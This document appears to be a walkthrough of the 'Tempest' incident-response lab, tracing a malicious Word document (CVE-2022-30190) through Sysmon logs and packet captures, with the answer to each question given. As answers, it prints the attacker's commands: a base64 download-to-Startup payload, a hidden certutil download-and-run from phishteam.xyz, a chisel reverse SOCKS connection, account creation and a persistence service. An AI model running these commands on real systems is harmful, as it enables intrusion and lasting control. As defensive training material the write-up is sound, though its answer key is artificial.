<h3>Tempest Incident</h3>

In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a **CRITICAL** severity that needs further investigation.

As reported by the <span style="color: #d4d0ca;">SOC</span> analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

- The malicious document has a **.doc** extension.
- The user downloaded the malicious document via **chrome.exe**.
- The malicious document then executed a chain of commands to attain code execution.

Investigation Guide

To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

- Start with the events generated by <span style="color: #d4d0ca;">Sysmon</span>.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret <span style="color: #d4d0ca;">Sysmon</span> logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and <span style="color: #d4d0ca;">DNS</span> Queries (Event ID 22) to correlate the activity generated by the malicious document.

Significant Data Sources:

- <span style="color: #d4d0ca;">Sysmon</span>

Answer the questions below

Q1: The user of this machine was compromised by a malicious document. What is the file name of the document?

Open the Timeline Explorer and open the sysmon.csv that we parsed earlier in the room.

We have two clues from the alert generated so we can either use ".doc" or "chrome.exe" at the search bar on the top right.

![image](https://github.com/user-attachments/assets/17fc0972-bf5c-453e-a0a2-c9c45b54d531)

ANS: free_magicules.doc

Q2: What is the name of the compromised user and machine?
*Format: username-machine name*

We'll be able to see who downloaded or opened the malicious document on the same row.

![image](https://github.com/user-attachments/assets/f8b59666-3a96-4a54-a7fd-d36af10205e2)

ANS: benimaru-TEMPEST

Q3: What is the PID of the Microsoft Word process that opened the malicious document?

We'll use the name of the malicious in the search bar and we can look for Event ID 1 which is Process Creation.

![image](https://github.com/user-attachments/assets/bd34230f-af1a-471c-a8f1-ce9f7b5deb76)

ANS: 496

Q4: Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

Let's take a note of where and when the malicious file opened and we'll start our investigation from there.

![image](https://github.com/user-attachments/assets/0aa2c51d-9aa6-4a0d-a39d-6bdd8e11f0ac)

We know that the malicious document was opened by PID 496 (winword.exe) and user "benimaru" so we will be filtering the events of that particular process and user.

![image](https://github.com/user-attachments/assets/af2145b5-e640-4300-a3eb-4579cbcbd8d8)

To answer the question, we'll take a closer look at Event IDs 3 and 22 which are "Network Connection" and "DNS Event" respectively.

![image](https://github.com/user-attachments/assets/3a2185e8-c362-4f4d-9b19-678d05c15053)

And once we examine the rows of those records, we'll have our answer.

ANS: 167.71.199.191

Q5: What is the base64 encoded string in the malicious payload executed by the document?

Now we have to find out the Child Processes that PID 496 (winword.exe) created when it opened the malicious document. We can do that by setting PID 496 as the Parent Process which in this case, located at "Payload Data5" column.
The payload will immediately stick out from the "Executable Info" column.

![image](https://github.com/user-attachments/assets/5a23f57a-4462-4e7a-84ca-5db8d1aa38a1)

ANS: JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

Q6: What is the CVE number of the exploit used by the attacker to achieve a remote code execution?
*Format: XXXX-XXXXX*

Study the payload for a bit and after a bit of googling, we'll find this page: https://lolbas-project.github.io/lolbas/Binaries/Msdt/

![image](https://github.com/user-attachments/assets/0e313d89-df2a-4dff-8e41-c5c31ece67a3)

ANS: 2022-30190

-------

<h3>Initial Access - Stage 2 execution</h3>

Malicious Document - Stage 2

Based on the initial findings, we discovered that there is a stage 2 execution:

- The document has successfully executed an encoded base64 command.
- Decoding this string reveals the exact command chain executed by the malicious document.

Investigation Guide

With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:

- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

Significant Data Sources:

- <span style="color: #d4d0ca;">Sysmon</span>

Answer the questions below

Q1: The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

Decode the base64

![image](https://github.com/user-attachments/assets/8415f76e-80e3-4e95-8d0d-291f6584ec94)


![image](https://github.com/user-attachments/assets/9a542c9b-a2fe-40e9-8cce-36784425a206)


ANS: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Q2: The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

*Format: Remove the double quotes from the log.*

We figure that the payload will autostart and a process will be created with explorer as our parent process. After using the appropriate filters, we found this.

![image](https://github.com/user-attachments/assets/3ec550e9-9524-4cd7-bf1a-98e4ef731712)


ANS: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

Q3: Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

Look for the instances of the downloaded "first.exe"

![image](https://github.com/user-attachments/assets/dfbd6b78-a896-4bbd-b266-bf9140585264)


ANS: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

Q4: The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

*Format: domain:port*

After looking around the events surrounding "first.exe", we found this:

![image](https://github.com/user-attachments/assets/733ba95c-8030-4001-8632-2ca9523f68b3)


We'll also notice that the IP resolve to this:

![image](https://github.com/user-attachments/assets/ea827a27-aaee-48dc-87af-3563a8f6fba7)


ANS: resolvecyber.xyz:8080

-------


<h3>Initial Access - Malicious Document Traffic</h3>

Malicious Document Traffic

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

- We discovered the Domain and IP invoked by the malicious document on <span style="color: #d4d0ca;">Sysmon</span> logs.
- There is another domain and IP used by the stage 2 payload logged from the same data source.

Investigation Guide

Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:

- We can now use **Brim and Wireshark** to investigate the packet capture.
- Find network events related to the harvested domains and IP addresses.
- Sample Brim filter that you can use for this investigation: `_path=="http" "<malicious domain>"`

Data Sources:

- Packet Capture

Answer the questions below

For this, I'll be using Brim and look for the malicious domain that we found earlier.

I used this filter to get the overview of the conversation that happened between the malicious domains and the host but you can use a more specific filter from the information we gathered from before.

_path=="http" | cut id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -c | sort value.host

![image](https://github.com/user-attachments/assets/e643084a-df5b-41a8-9c84-1f8441d42f46)


Q1: What is the URL of the malicious payload embedded in the document?

*refer to the Brim result*

ANS:h[tt]p://phishteam[.]xyz/02dcf07/index[.]html

Q2: What is the encoding used by the attacker on the c2 connection?

We know that the attacker's c2 is the "resolvecyber.xyz" domain and after looking at the URI, we can guess that the attacker is using the Base64 encoding. We can test that by going to a decoder and decoding the string that comes after "?q=".

![image](https://github.com/user-attachments/assets/23607d6b-6b52-4c8c-a4e9-f0992fff4299)


![image](https://github.com/user-attachments/assets/88f41c95-3c42-42b0-8c2d-f2d2830bbf52)


ANS: Base64

Q3: The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

ANS: q

Q4: The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

ANS: /9ab62b5

Q5: What is the HTTP method used by the binary?

ANS: GET

Q6: Based on the user agent, what programming language was used by the attacker to compile the binary?
*Format: Answer in lowercase*

For this, we will be adding another column to our filter called "user_agent"

![image](https://github.com/user-attachments/assets/4f986e48-00fb-4da4-a4dc-60df04e0657a)


ANS:nim

-------

<h3>Discovery - Internal Reconnaissance</h3>

Internal Reconnaissance

Based on the collected findings, we have discovered that the malicious binary continuously uses the <span style="color: #d4d0ca;">C2</span> traffic:

- We can easily decode the encoded string in the network traffic.
- The traffic contains the command and output executed by the attacker.

Investigation Guide

To continue with the investigation, we may focus on the following information:

- Find network and process events connecting to the malicious domain.
- Find network events that contain an encoded command.
- We can use Brim to filter all packets containing the encoded string.
- Look for endpoint enumeration commands since the attacker is already inside the machine.

In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:

- To get all <span style="color: #d4d0ca;">HTTP</span> requests related to the malicious <span style="color: #d4d0ca;">C2</span> traffic: `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`

Significant Data Sources:

- Packet Capture
- <span style="color: #d4d0ca;">Sysmon</span>

Answer the questions below

The room provided us with the filter so we will be using that.

![image](https://github.com/user-attachments/assets/b5d8fd50-94be-4342-9432-5fb46d47f128)


For now, let's decode everything and use the decoded result to answer the following questions.

![image](https://github.com/user-attachments/assets/5a67afbb-d5a3-4cc5-945b-e69bc1800291)


Q1: The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

![image](https://github.com/user-attachments/assets/9a693797-cc4b-416f-9a50-9b318906ece7)

ANS: infernotempest

Q2: The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

![image](https://github.com/user-attachments/assets/7d5c0430-0e10-4205-8348-56d14faf253c)

After googling each of the listening ports, I found this.

![image](https://github.com/user-attachments/assets/7334e061-f525-42a8-a173-35c03a68d895)

ANS: 5985

Q3: The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
*Format: Remove the double quotes from the log.*

*We already found this earlier:*
![image](https://github.com/user-attachments/assets/0713494b-4ce8-46f5-9df1-f1e074b34d30)


ANS: C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

Q4: What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

On the same row, navigate to the "Payload Data3"

ANS: 8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451

Q5: What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

We'll use VirusTotal and search for the hash that we just got.

![image](https://github.com/user-attachments/assets/43069dc8-f9f7-4765-809c-429f0fb73db2)

ANS: chisel

Q6: The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
*Format: Answer in lowercase*

A process immediately spawned after the connection.

![image](https://github.com/user-attachments/assets/f5ff4d41-8180-4461-97c2-1810189762ee)

A bit more googling, we found this:

![image](https://github.com/user-attachments/assets/7508ea72-761e-4a17-b81c-52565046db2b)

This coincides with the answer for an exploitable port that we found earlier.

ANS: winrm

-------

<h3>Privilege Escalation - Exploiting Privileges</h3>

Privilege Escalation

Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.

Investigation Guide

With this, we can focus on the following network and endpoint events:

- Look for events executed after the successful execution of the reverse socks proxy tool.
- Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

Significant Data Sources:

- Packet Capture
- <span style="color: #d4d0ca;">Sysmon</span>

Answer the questions below

By filtering our parent process with "wsmprovhost.exe", we get this:

![image](https://github.com/user-attachments/assets/1197ae14-975e-4f71-94ee-74d744ce71ff)

Q1: After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

*Format: binary name,SHA256 hash*

ANS: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

Q2: Based on the SHA256 hash of the binary, what is the name of the tool used?

We'll use VirusTotal once again to look up the hash

![image](https://github.com/user-attachments/assets/46152197-f678-4082-8a04-2a26692b067d)
*Format: Answer in lowercase*

ANS: printspoofer

Q3: The tool exploits a specific privilege owned by the user. What is the name of the privilege?

After gathering more information about printspoofer, we'll find this.

![image](https://github.com/user-attachments/assets/a5597644-d5a1-4b35-8563-34505a6975b7)

ANS: SeImpersonatePrivilege

Q4: Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

![image](https://github.com/user-attachments/assets/03be1465-cec3-4f4a-9e0e-703c93cab234)

ANS:final.exe

Q5: The binary connects to a different port from the first c2 connection. What is the port used?

Let's go back to the Brim result and remove our port filter.

![image](https://github.com/user-attachments/assets/ff807ad0-c0a8-443b-bfdc-2931187be4a3)

ANS:8080

-------

<h3>Actions on Objective - Fully-owned Machine</h3>

Fully-Owned Machine

Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.

In addition, the unusual executions are related to the malicious <span style="color: #d4d0ca;">C2</span> binary used during privilege escalation.

Investigation Guide

Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

- Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
- The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with **NT Authority\System.**
- All child events of the new malicious binary used for <span style="color: #d4d0ca;">C2</span> are worth checking.

Significant Data Sources:

- Packet Capture
- <span style="color: #d4d0ca;">Sysmon</span>
- Windows Event Logs

Answer the questions below

We can see system level commands after the execution of "final.exe"

![image](https://github.com/user-attachments/assets/711be3f6-8c70-4f0d-b763-bc9db0ecf572)

Q1: Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
*Format: Answer in alphabetical order - comma delimited*

ANS: shion,shuna

Q2: Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

Once again, let's decode and the commands that was sent from the attacker's C2 and figure out what he did.

![image](https://github.com/user-attachments/assets/d40da3d2-12ec-4af9-8dc5-cfb1ee608562)

ANS: /add

Q3: Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

A quick google will give us the answer.
ANS: 4720

Q4: The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

ANS: net localgroup administrators /add shion

Q5: Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

A quick google will give us the answer.
ANS: 4732

After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
*Format: Remove the double quotes from the log.*

Study the logs that are related to "final.exe" further.
![image](https://github.com/user-attachments/assets/08f6e299-f747-4196-bd1d-6e2fdbf3e843)

ANS: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto



